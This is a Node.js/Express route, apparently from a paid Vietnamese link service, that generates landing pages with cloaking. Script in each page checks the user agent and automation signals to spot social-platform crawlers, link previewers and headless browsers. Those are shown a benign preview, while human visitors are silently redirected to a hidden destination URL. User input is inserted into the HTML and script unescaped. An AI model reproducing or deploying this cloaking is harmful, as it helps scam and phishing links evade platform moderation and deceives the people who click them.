import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs/promises';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import authMiddleware from '../middleware/auth.js';
import User from '../models/user.js';
import Link from '../models/link.js';

// Get the current file's directory
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const router = express.Router();
const upload = multer({ dest: '../uploads/' });

router.post('/api/generate-landing', authMiddleware, upload.single('image'), async (req, res) => {
  try {
    const { title, description, redirectUrl } = req.body;
    const imagePath = req.file.path;

    // Lấy thông tin người dùng từ token
    const userId = req.user.userId;

    // Tìm người dùng trong cơ sở dữ liệu
    const user = await User.findById(userId);

    if (!user) {
      return res.status(404).json({ message: 'Người dùng không tồn tại!' });
    }

    // Kiểm tra plan và số lượt tạo link còn lại
    const plan = user.plan;
    const remainingLinks = plan.totalLinks - plan.usedLinks;

    if (remainingLinks <= 0) {
      return res.status(403).json({ message: `Bạn đã hết số lượt tạo link. Vui lòng mua thêm hoặc liên hệ @otis_cua` });
    }

    // Generate a unique ID for the landing page
    const generateShortId = () => {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let result = '';
        for (let i = 0; i < 12; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    };
    
    const landingId = generateShortId();

    // Create the HTML content
    const htmlContent = `
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${title}</title>
    <meta name="description" content="${description}">
    <meta name="image" content="../build/${req.file.filename}">
    <meta name="keywords" content="${title}">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="article">
    <meta property="og:title" content="${title}">
    <meta property="og:description" content="${description}">
    <meta property="og:image" content="../build/${req.file.filename}">
    <meta property="og:image:url" content="..uild/${req.file.filename}">
    <meta property="og:image:type" content="image/${path.extname(req.file.originalname).slice(1)}">
    <meta property="og:image:width" content="${req.file.size.width}">
    <meta property="og:image:height" content="${req.file.size.height}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${title}">
    <meta name="twitter:description" content="${description}">
    <meta name="twitter:image" content="../build/${req.file.filename}">
    <script>
        function detectBot() {
            const botPatterns = [
                'bot', 'spider', 'crawl', 'slurp', 'facebook', 'whatsapp',
                'telegram', 'viber', 'twitter', 'discord', 'slack',
                'linkedin', 'skype', 'pinterest', 'zoom'
            ];

            const userAgent = navigator.userAgent.toLowerCase();

            if (botPatterns.some(pattern => userAgent.includes(pattern))) {
                return true;
            }

            if (navigator.webdriver || window.navigator.webdriver) {
                return true;
            }

            const automationTools = [
                '_phantom',
                '__nightmare',
                'callPhantom',
                'buffer',
                'awesomium',
                'cef',
                'selenium',
                'headless',
                'phantomjs',
                'nightmarejs',
                'rhino'
            ];

            for (const tool of automationTools) {
                if (window[tool]) {
                    return true;
                }
            }

            if (navigator.plugins.length === 0) {
                return true;
            }

            return false;
        }

        window.onload = function() {
            if (!detectBot()) {
                window.location.replace("${redirectUrl}");
            } else {
                document.getElementById('content').style.display = 'block';
            }
        };
    </script>
</head>
<body>
    <div id="content" style="display: none">
        <h1>${title}</h1>
        <img src="../build/${req.file.filename}" alt="${title}" width="${req.file.size.width}" height="${req.file.size.height}">
        <p>${description}</p>
    </div>
</body>
</html>
    `;

    // Save the HTML file
    const htmlFilePath = path.join(__dirname, '../build', `${landingId}/index.html`);
    
    // Create directory for this landing page
    await fs.mkdir(path.join(__dirname, '../build', landingId), { recursive: true });
    await fs.writeFile(htmlFilePath, htmlContent);

    // Move the original image to the build folder
    const finalImagePath = path.join(__dirname, '../build', req.file.filename);
    await fs.rename(imagePath, finalImagePath);

    // Use the correct port from the environment or default to 3000
    const port = process.env.PORT || 3000;
    const domain = process.env.LANDING_DOMAIN || `http://localhost:${port}`;
    const generatedUrl = `${domain}/build/${landingId}`;

    // Lưu link vào cơ sở dữ liệu
    const newLink = new Link({
      username: user.username,
      plan: plan.type,
      createdAt: new Date(),
      url: generatedUrl,
      redirectUrl: redirectUrl, // Lưu link đích
      clicks: 0,
    });
    await newLink.save();

    // Tăng số lượt đã tạo link của người dùng
    user.plan.usedLinks += 1;
    await user.save();

    res.json({ url: generatedUrl, imageUrl: `${domain}/build/${req.file.filename}` });
  } catch (error) {
    console.error('Error generating landing page:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

export default router; 